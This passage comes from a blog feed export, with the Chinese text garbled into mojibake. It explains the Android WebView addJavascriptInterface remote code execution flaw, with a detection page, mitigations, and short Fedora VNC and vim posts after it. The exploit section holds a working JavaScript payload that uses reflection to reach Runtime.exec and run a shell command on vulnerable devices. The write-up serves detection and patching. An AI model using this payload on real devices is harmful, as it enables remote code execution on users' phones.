oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&gt; javac -d . Reflect/hello.java<br>&gt; java Reflect.hello<br><br>Reflect.Demo<br><span class="hljs-keyword">method</span> = <span class="hljs-title function_">a1</span><br><span class="hljs-title function_">method</span> = <span class="hljs-title function_">a2</span><br><span class="hljs-title function_">I</span> <span class="hljs-title function_">am</span> <span class="hljs-title function_">a1</span><br></code></pre></td></tr></table></figure><p>å·²ç»æˆåŠŸè°ƒç”¨äº†Demoçš„private a1 æ–¹æ³•</p><h2 id="â˜†-ç›¸å…³æ¼æ´"><a href="#â˜†-ç›¸å…³æ¼æ´" class="headerlink" title="â˜†  ç›¸å…³æ¼æ´"></a>â˜†  ç›¸å…³æ¼æ´</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobileã€eAccessã€KDDIã€NTT DOCOMOã€SoftBankè®¾å¤‡ä¸Šçš„Android 3.0è‡³4.1.xç‰ˆ<br>æœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰æ­£ç¡®å®ç°WebViewç±»ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„ç½‘<br>é¡µåˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Javaå¯¹è±¡çš„æ–¹æ³•æˆ–é€ æˆæ‹’ç»æœåŠ¡ï¼ˆé‡å¯ï¼‰</p><h3 id="CVE-2012-6636-å…³é”®çš„CVE"><a href="#CVE-2012-6636-å…³é”®çš„CVE" class="headerlink" title="CVE-2012-6636  (å…³é”®çš„CVE)"></a>CVE-2012-6636  (å…³é”®çš„CVE)</h3><p>è¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰æ­£ç¡®é™åˆ¶ä½¿ç”¨WebView.addJavascriptInterfaceæ–¹æ³•ï¼Œè¿œç¨‹æ”»å‡»è€…å¯<br>é€šè¿‡ä½¿ç”¨Java Reflection åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Javaå¯¹è±¡çš„æ–¹æ³•ã€‚å½±å“ä½¿ç”¨ API Level 16<br>ä»¥åŠä¹‹å‰çš„Android ç³»ç»Ÿã€‚(Android 4.2 ä¸º API Level 17)</p><h3 id="CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><a href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean" class="headerlink" title="CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean"></a>CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</h3><p>æ­¤æ¼æ´å…¬å¸ƒäº†ä¸€ä¸ªå¯åˆ©ç”¨çš„Java Object â€œsearchBoxJavaBridge_â€</p><h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>æ ¹æ® android&#x2F;webkit&#x2F;AccessibilityInjector.java ä»£ç ä¸­çš„ä»‹ç»ï¼Œå‘ç°å½“ç³»ç»Ÿè¾…åŠ©<br>åŠŸèƒ½ä¸­çš„ä»»æ„ä¸€é¡¹æœåŠ¡è¢«å¼€å¯åï¼Œæ‰€æœ‰ç”±ç³»ç»Ÿæä¾›çš„WebViewéƒ½ä¼šè¢«åŠ å…¥ä¸¤ä¸ªJS objectsï¼Œ<br>åˆ†åˆ«ä¸ºæ˜¯â€accessibilityâ€  å’Œ â€œaccessibilityTraversalâ€ã€‚å¦‚æœAPPä½¿ç”¨äº†ç³»ç»Ÿçš„WebView<br>å¹¶ä¸”è®¾ç½®äº†setJavaScriptEnabled()ï¼Œé‚£ä¹ˆæ¶æ„æ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨â€accessibilityâ€ å’Œ<br>â€œaccessibilityTraversalâ€ è¿™ä¸¤ä¸ªJava Bridgeæ¥æ‰§è¡Œè¿œç¨‹æ”»å‡»ä»£ç </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>   è¿™äº›CVEä¸­æœ€æ ¸å¿ƒçš„æ˜¯CVE-2012-6636, å‡ºç°çš„é—®é¢˜æ˜¯æ¥å£å®šä¹‰é—®é¢˜ã€‚æ˜¯éå¸¸ç»å…¸çš„<br>do a å˜æˆ do b çš„ä¾‹å­ï¼Œåé¢çš„ä¿®å¤æ–¹æ³•ä¹Ÿæ˜¯ä¿è¯äº†do a å°±æ˜¯ do aã€‚</p><h2 id="â˜†-æ¼æ´æ£€æµ‹"><a href="#â˜†-æ¼æ´æ£€æµ‹" class="headerlink" title="â˜† æ¼æ´æ£€æµ‹"></a>â˜† æ¼æ´æ£€æµ‹</h2><p>   ä½¿ç”¨WebViewè®¿é—®ä¸‹é¢é¡µé¢ï¼Œè¾“å‡ºçš„æ¥å£åç§°åˆ™å­˜åœ¨æ¼æ´ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WebViewæ¼æ´æ£€æµ‹<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0,</span></span><br><span class="hljs-string"><span class="hljs-tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>å¦‚æœå½“å‰appå­˜åœ¨æ¼æ´ï¼Œå°†ä¼šåœ¨é¡µé¢ä¸­è¾“å‡ºå­˜åœ¨æ¼æ´çš„æ¥å£æ–¹ä¾¿ç¨‹åºå‘˜åšå‡ºä¿®æ”¹ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> obj <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) </span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;getClass&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>[obj]) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>[obj].<span class="hljs-title function_">getClass</span>();</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>);</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>);</span><br><span class="language-javascript">                &#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">catch</span>(e) &#123;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">check</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>   ç°ä»£æµè§ˆå™¨éƒ½å®ç°åŸºæœ¬ä¸€è‡´çš„BOMï¼Œä½¿å¾—JavaScriptå’Œæµè§ˆå™¨è¿›è¡Œæ¶ˆæ¯ä¼ é€’ã€‚<br>   æ˜¯å¦æœ‰getClassçš„æ–¹æ³•ï¼Œå¯ä»¥ä½œä¸ºæ£€æµ‹WebViewæ¼æ´ä¾æ®ã€‚</p><p>   åœ¨Android 4.1.1 åŸç”Ÿç³»ç»Ÿä¸Šæµ‹è¯•ï¼Œåœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œå­˜åœ¨ searchBoxJavaBridge_<br>   å¯ä»¥åˆ©ç”¨ï¼ŒCVE-2014-7224ä¸Šçš„ä¸¤ä¸ªæ¥å£ï¼Œå¹¶æ²¡æœ‰æˆåŠŸæš´éœ²ã€‚çœ‹äº†æºä»£ç åå‘ç°å¿…é¡»<br>   æ‰“å¼€Accessibility è®¾ç½®ä¸­çš„Enhance Web accessibility æ‰ä¼šæš´éœ²è¿™ä¸ªä¸¤ä¸ªæ¥å£ï¼Œ<br>   å› æ­¤CVE-2014-7224çš„å½±å“å¹¶ä¸åƒæƒ³è±¡ä¸­çš„é‚£ä¹ˆå¤§ã€‚</p><h2 id="â˜†-æ¼æ´åˆ©ç”¨çš„æ–¹æ³•"><a href="#â˜†-æ¼æ´åˆ©ç”¨çš„æ–¹æ³•" class="headerlink" title="â˜† æ¼æ´åˆ©ç”¨çš„æ–¹æ³•"></a>â˜† æ¼æ´åˆ©ç”¨çš„æ–¹æ³•</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">cmd</span>)&#123;</span><br><span class="language-javascript">  <span class="hljs-keyword">return</span></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">jsinterface</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;getRuntime&#x27;</span>,<span class="hljs-literal">null</span>).<span class="hljs-title function_">invoke</span>(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>).<span class="hljs-title function_">exec</span>(cmd);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">execute</span>([<span class="hljs-string">&#x27;/system/bin/sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>   jsinterfaceæ˜¯å¯¼å‡ºçš„Javaå¯¹è±¡ï¼Œ æµ‹è¯•æˆåŠŸï¼Œæƒé™æ˜¯app çš„ç”¨æˆ·æƒé™ã€‚</p><h2 id="â˜†-ä¿®å¤æ–¹æ³•å’Œç°çŠ¶"><a href="#â˜†-ä¿®å¤æ–¹æ³•å’Œç°çŠ¶" class="headerlink" title="â˜† ä¿®å¤æ–¹æ³•å’Œç°çŠ¶"></a>â˜† ä¿®å¤æ–¹æ³•å’Œç°çŠ¶</h2><p>   Googleå®£å¸ƒä¸ä¸ºå°äºAndroid 4.4 çš„ç³»ç»Ÿæä¾›WebViewè¡¥ä¸, å…·ä½“å¯ä»¥å‚è§é“¾æ¥ï¼š</p><p><a href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p><p>   è¦è§£å†³WebViewçš„RCEæ¼æ´ï¼Œæ¯”è¾ƒé è°±çš„æ–¹æ³•æ˜¯å‡çº§Androidç³»ç»Ÿï¼Œè‡³å°‘è¦å‡çº§åˆ°<br>   API level 17 (Android 4.2), WebView é™¤äº†æœ€ä¸¥é‡çš„RCEæ¼æ´ï¼Œè¿˜æœ‰å„ç§SOPæ¼æ´ï¼Œæ‰€<br>   ä»¥è‡³å°‘è¦å‡çº§åˆ°Android 4.4æ‰èƒ½ä¿è¯å®‰å…¨ï¼Œå°äºAndroid 4.4 Googleä¸æä¾›è¡¥ä¸ã€‚<br>   Android 4.4 ä»¥åä½¿ç”¨ä»¥chromeä¸ºåŸºç¡€çš„WebViewã€‚</p><p>   å‡çº§ç³»ç»ŸAPI level 17åï¼Œåªæœ‰æ˜¾ç¤ºæ·»åŠ  @JavascriptInterfaceçš„æ–¹æ³•æ‰èƒ½è¢«JavaScript<br>   è°ƒç”¨ï¼Œè¿™æ ·åå°„å°±å¤±å»ä½œç”¨äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">removeJavascriptInterface(<span class="hljs-string">&quot;accessibility&quot;</span>);<br>removeJavascriptInterface(<span class="hljs-string">&quot;accessibilityTraversal&quot;</span>);<br>removeJavascriptInterface(<span class="hljs-string">&quot;searchBoxJavaBridge_&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="â˜†-å‚è€ƒé“¾æ¥"><a href="#â˜†-å‚è€ƒé“¾æ¥" class="headerlink" title="â˜† å‚è€ƒé“¾æ¥"></a>â˜† å‚è€ƒé“¾æ¥</h2><ul><li><a href="http://developer.android.com/guide/webapps/webview.html">http://developer.android.com/guide/webapps/webview.html</a></li><li><a href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a></li><li><a href="https://daoyuan14.github.io/news/newattackvector.html">https://daoyuan14.github.io/news/newattackvector.html</a></li><li><a href="http://droidsploit.baidu.com/view/14100201.html">http://droidsploit.baidu.com/view/14100201.html</a></li><li><a href="http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html">http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html</a></li><li><a href="http://tutorials.jenkov.com/java-reflection/index.html">http://tutorials.jenkov.com/java-reflection/index.html</a></li><li><a href="http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html">http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html</a></li><li><a href="http://www.programcreek.com/2013/09/java-reflection-tutorial/">http://www.programcreek.com/2013/09/java-reflection-tutorial/</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/">https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/</a></li><li><a href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li></ul><h2 id="â˜†-æ€è€ƒ"><a href="#â˜†-æ€è€ƒ" class="headerlink" title="â˜† æ€è€ƒ"></a>â˜† æ€è€ƒ</h2><p>   WebView ä¸­è¿˜æä¾›äº†ä¸€ä¸ªæ–¹æ³•è®©æˆ‘ä»¬å¯ä»¥è·å¾—æ§åˆ¶çš„æœºä¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldOverrideUrlLoading</span><span class="hljs-params">(WebView view, String url)</span> &#123;<br>  <span class="hljs-keyword">if</span> (url.substring(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>).equalsIgnoreCase(<span class="hljs-string">&quot;yourscheme:&quot;</span>)) &#123;<br>    <span class="hljs-comment">// parse the URL object and execute functions</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>   å¦‚æœä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œåœ¨ç½‘é¡µçš„javascriptä¸­æ·»åŠ ä¸‹é¢çš„ä»£ç ï¼Œå°±å¯ä»¥è¿›å…¥åé¢çš„è§£æ<br>   URLæµç¨‹ï¼Œå¦‚æœåç»­ä»£ç æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥å¯èƒ½ä¼šæœ‰ä¸€äº›å…¶ä»–çš„å®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-attr">yourscheme</span>:<span class="hljs-comment">//method?parameter=value</span><br></code></pre></td></tr></table></figure><p>Googleå¯¹è¿™ä¸ªæ–¹æ³•çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Give the host application a chance <span class="hljs-keyword">to</span> take <span class="hljs-keyword">over</span> the control <span class="hljs-keyword">when</span> a <span class="hljs-built_in">new</span> url <br><span class="hljs-keyword">is</span> about <span class="hljs-keyword">to</span> be loaded <span class="hljs-keyword">in</span> the <span class="hljs-keyword">current</span> WebView. <span class="hljs-keyword">If</span> WebViewClient <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <br>provided, <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span> WebView will ask Activity Manager <span class="hljs-keyword">to</span> choose the proper <br><span class="hljs-keyword">handler</span> <span class="hljs-keyword">for</span> the url. <span class="hljs-keyword">If</span> WebViewClient <span class="hljs-keyword">is</span> provided, <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span> means the <br>host application handles the url, <span class="hljs-keyword">while</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span> means the <span class="hljs-keyword">current</span> <br>WebView handles the url. This <span class="hljs-keyword">method</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">called</span> <span class="hljs-keyword">for</span> requests <span class="hljs-keyword">using</span> <br>the POST &quot;method&quot;.<br></code></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯å½“WebViewåŠ è½½æ–°çš„URLæ—¶ç»™Appç¨‹åºä¸€ä¸ªæ§åˆ¶çš„æœºä¼šï¼Œè¿™è¿˜æ˜¯æœ‰ä¸€äº›æƒ³è±¡ç©ºé—´çš„ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora å®‰è£… vnc server</title>
    <link href="/cn/vnc/"/>
    <url>/cn/vnc/</url>
    
    <content type="html"><![CDATA[<p>å› ä¸ºç–«æƒ…ï¼Œç°åœ¨å…¬å¸å¯ç”¨è¿œç¨‹åŠå…¬äº†ï¼Œä¸å¾—å·²åœ¨å·¥ä½œæœºä¸Šå¼€äº†vncserverï¼Œè¿™ç¯‡æ–‡æ¡£åšä¸ªè®°å½•ã€‚</p><h2 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="(1) å®‰è£…"></a>(1) å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf install tigervnc-server<br></code></pre></td></tr></table></figure><h2 id="2-åˆ›å»ºæœåŠ¡"><a href="#2-åˆ›å»ºæœåŠ¡" class="headerlink" title="(2) åˆ›å»ºæœåŠ¡"></a>(2) åˆ›å»ºæœåŠ¡</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>vncserver@.service <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/</span>vncserver@.service<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘ &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;vncserver@.service æ›¿æ¢ä¸‹é¢ä¸¤è¡Œçš„USERä¸ºå®é™…ç”¨æˆ·å</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">ExecStart</span>=/sbin/runuser -l<span class="hljs-built_in"> USER </span>-c <span class="hljs-string">&quot;/usr/bin/vncserver %i -geometry 1280x1024&quot;</span><br><span class="hljs-attribute">PIDFile</span>=/home/USER/.vnc/%H%i.pid<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ <code>systemctl daemon-reload</code></p><p>ä½¿ç”¨vpnpasswdä¿®æ”¹å¯†ç </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">~]<span class="hljs-comment"># su - USER</span><br>~]$ vncpasswd<br>Password:<br>Verify:<br></code></pre></td></tr></table></figure><p>å¯åŠ¨vncserverçš„å‘½ä»¤è¡Œ</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">sudo systemctl start <span class="hljs-symbol">vncserver@</span>:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡æ¡£ï¼š</p><p><a href="https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html">https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html</a></p><h2 id="3-ç›´æ¥è°ƒç”¨å‘½ä»¤è¡Œ"><a href="#3-ç›´æ¥è°ƒç”¨å‘½ä»¤è¡Œ" class="headerlink" title="(3)ç›´æ¥è°ƒç”¨å‘½ä»¤è¡Œ"></a>(3)ç›´æ¥è°ƒç”¨å‘½ä»¤è¡Œ</h2><p>ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•è¿‡äºç¹çï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ vncserver çš„å‘½ä»¤è¡Œ</p><p><code>vncserver :2 -geometry 1920x1080 -depth 24</code></p><h2 id="4-æ”¹å˜vncçš„é»˜è®¤æ¡Œé¢"><a href="#4-æ”¹å˜vncçš„é»˜è®¤æ¡Œé¢" class="headerlink" title="(4) æ”¹å˜vncçš„é»˜è®¤æ¡Œé¢"></a>(4) æ”¹å˜vncçš„é»˜è®¤æ¡Œé¢</h2><p>vim ~&#x2F;.vnc&#x2F;xstartup</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">unset</span> SESSION_MANAGER<br><span class="hljs-built_in">unset</span> DBUS_SESSION_BUS_ADDRESS<br><span class="hljs-comment">#exec /etc/X11/xinit/xinitrc</span><br><br><span class="hljs-built_in">exec</span> /bin/sh /etc/xdg/xfce4/xinitrc<br></code></pre></td></tr></table></figure><p>å¿…é¡»æ”¹å˜é»˜è®¤æ¡Œé¢ï¼Œè¦ä¸å¯èƒ½ç™»å½•ä¸è¿›å»ã€‚</p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>ä¸ªäººè§‰å¾—ä»å®‰å…¨è§’åº¦çœ‹ï¼Œä½¿ç”¨å‘½ä»¤å¯ç”¨ vncserver æ˜¯æ¯”è¾ƒåˆç†çš„ï¼Œè¦ç”¨äº†å°±æ‰“å¼€ï¼Œç”¨å®Œå°±å…³ã€‚å¦å¤–vncserver è¿æ¥åŠ äº†ä¸€å±‚ tunnelï¼Œå®‰å…¨æ— å°äº‹ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim è¾“å…¥ç‰¹æ®Šå­—ç¬¦</title>
    <link href="/cn/vim_special_char/"/>
    <url>/cn/vim_special_char/</url>
    
    <content type="html"><![CDATA[<p>vim çš„ç¼–è¾‘èƒ½åŠ›ç¡®å®å¾ˆå¼ºï¼Œä»Šå¤©è¯´ä¸€ä¸‹å¦‚ä½•åœ¨vimä¸­è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œæ¯”å¦‚éŸ³æ ‡ã€unicode å­—ç¬¦ã€‚</p><p><a href="http://vimhelp.appspot.com/digraph.txt.html">http://vimhelp.appspot.com/digraph.txt.html</a><br><a href="http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit">http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit</a></p><p>å…³é”®å°±åœ¨ä¸Šé¢ä¸¤ç¯‡ï¼Œå¯èƒ½è®¸å¤šäººä¸å–œæ¬¢çœ‹å¤æ‚çš„æ–‡ç« ï¼Œæˆ‘è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ç”¨æ³•ã€‚</p><p>è¾“å…¥éŸ³æ ‡ É™</p><p>i è¿›å…¥ç¼–è¾‘æ¨¡å¼    CTRL-vu0259<br>é‚£å¦‚ä½•çŸ¥é“ É™ çš„ unicode hex number æ˜¯ 0259å‘¢ï¼Œåœ¨vimçš„normal æ¨¡å¼ä¸‹ï¼Œå°†å…‰æ ‡ç§»åŠ¨åˆ°É™è¾“å…¥ga</p><p>è¾“å…¥ â‡’</p><p>i è¿›å…¥ç¼–è¾‘æ¨¡å¼   CTRL-k&#x3D;&gt;<br>:dig å¯ä»¥çœ‹åˆ°æ”¯æŒè¿™ç§æ–¹æ³•è¾“å…¥çš„unicode å­—ç¬¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VIM + SVN ç®¡ç†</title>
    <link href="/cn/svn_vim/"/>
    <url>/cn/svn_vim/</url>
    
